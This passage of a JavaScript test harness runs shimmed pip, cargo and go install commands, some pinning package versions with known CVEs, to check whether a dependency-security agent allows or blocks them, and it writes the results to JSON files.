      expect: EXPECT_ALLOW,
    },
    {
      id: 'cli-pip-install-cve',
      tool: 'pip',
      args: ['install', 'urllib3==1.26.5', '--target', 'vendor', '--no-deps', '--disable-pip-version-check'],
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-pip-install-requirements-cve',
      tool: 'pip',
      args: ['install', '-r', 'requirements.txt', '--target', 'vendor', '--no-deps', '--disable-pip-version-check'],
      setup: setupPipRequirements,
      expect: EXPECT_NOT_ALLOW,
    },
    {
      id: 'cli-cargo-add-clean',
      tool: 'cargo',
      args: ['add', 'serde@1.0.197'],
      setup: setupCargoProject,
      expect: EXPECT_ALLOW,
    },
    {
      id: 'cli-cargo-add-cve',
      tool: 'cargo',
      args: ['add', 'time@0.1.44'],
      setup: setupCargoProject,
      expect: EXPECT_ALLOW,
    },
    {
      id: 'cli-go-get-clean',
      tool: 'go',
      args: ['get', 'github.com/google/uuid@v1.6.0'],
      setup: setupGoProject,
      expect: EXPECT_ALLOW,
    },
    {
      id: 'cli-go-get-cve',
      tool: 'go',
      args: ['get', 'golang.org/x/crypto@v0.0.0-20211202192323-5770296d904e'],
      setup: setupGoProject,
      expect: EXPECT_NOT_ALLOW,
    },
  ];
}

async function runCliSuite(options, credentials) {
  const { agentExe, shimDir } = setupShims(options);
  const programDataDir = setupCliCredentials(options, credentials);
  const env = testEnv(shimDir, programDataDir, credentials);
  const flowsDir = ensureDir(path.join(options.outDir, 'developer-flows'));
  const cases = cliCases(flowsDir);
  const results = [];
  console.log(`[cli] Using agent ${agentExe}`);
  console.log(`[cli] Running ${cases.length} shimmed developer-flow commands`);
  for (let i = 0; i < cases.length; i += 1) {
    const test = cases[i];
    const cwd = ensureDir(path.join(flowsDir, test.id));
    if (test.setup) {
      try {
        test.setup(cwd);
      } catch (err) {
        const setupFailure = {
          id: test.id,
          ok: false,
          expected: test.expect,
          setupError: err.message,
        };
        results.push(setupFailure);
        console.log(`[cli] ${i + 1}/${cases.length} ${test.id}: SETUP_FAIL FAIL`);
        continue;
      }
    }
    const output = runCommand(test.tool, test.args, cwd, env, 240000);
    const action = parseCliAction(output);
    const ok = commandPassed(output, test.expect);
    const trimmed = {
      ...output,
      stdout: output.stdout.slice(-12000),
      stderr: output.stderr.slice(-12000),
    };
    const result = {
      id: test.id,
      ok,
      expected: test.expect,
      parsedAction: action,
      output: trimmed,
    };
    results.push(result);
    console.log(`[cli] ${i + 1}/${cases.length} ${test.id}: ${action || `exit ${output.exitCode}`} ${ok ? 'PASS' : 'FAIL'}`);
  }
  const summary = summarizeCliResults(results);
  const output = {
    startedAt: new Date().toISOString(),
    agentExe,
    shimDir,
    programDataDir,
    summary,
    results,
  };
  writeJson(path.join(options.outDir, 'cli-results.json'), output);
  return output;
}

function summarizeCliResults(results) {
  const failed = results.filter((result) => !result.ok);
  const byAction = {};
  for (const result of results) {
    const action = result.parsedAction || `EXIT_${result.output?.exitCode ?? 'SETUP'}`;
    byAction[action] = (byAction[action] || 0) + 1;
  }
  return {
    total: results.length,
    passed: results.length - failed.length,
    failed: failed.length,
    byAction,
    failedIds: failed.map((result) => result.id),
  };
}

async function prepare(options, credentials) {
  ensureDir(options.outDir);
  const scope = await resolveScope(credentials);
  writeJson(path.join(options.outDir, 'scope.json'), {
    generatedAt: new Date().toISOString(),
    apiBaseUrl: credentials.apiBaseUrl,
    orgId: scope.orgId,
    siteId: scope.siteId,
    keyId: scope.keyId,
    keyType: scope.keyType,
    role: scope.role,
  });
  writeJson(path.join(options.outDir, 'coordinates.json'), coordinates());
  writeJson(path.join(options.outDir, 'test-plan.json'), {
    generatedAt: new Date().toISOString(),
    apiTests: API_TESTS.map((test) => ({
      id: test.id,
      tool: test.tool,
      target: test.target,
      expect: test.expect,
      context: test.context || {},
    })),
  });
  console.log(`[prepare] Output dir: ${options.outDir}`);
  console.log(`[prepare] Scope: org=${scope.orgId} site=${scope.siteId || '(none)'}`);
  console.log(`[prepare] Coordinates: ${path.join(options.outDir, 'coordinates.json')}`);
  return scope;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  ensureDir(options.outDir);
  const credentials = readCredentials(options.credentialsPath);
  if (options.mode === 'prepare') {
    await prepare(options, credentials);
    return;
  }
  if (!fs.existsSync(path.join(options.outDir, 'scope.json'))) {
    await prepare(options, credentials);
  }
  runInfraPreflight(options);
  if (options.mode === 'api' || options.mode === 'all') {
    await runApiSuite(options, credentials);
  }
  if (options.mode === 'cli' || options.mode === 'all') {
    await runCliSuite(options, credentials);
  }
  console.log(`[done] Results written under ${options.outDir}`);
}

main().catch((err) => {
  console.error(err.stack || err.message || String(err));
  process.exit(1);
});
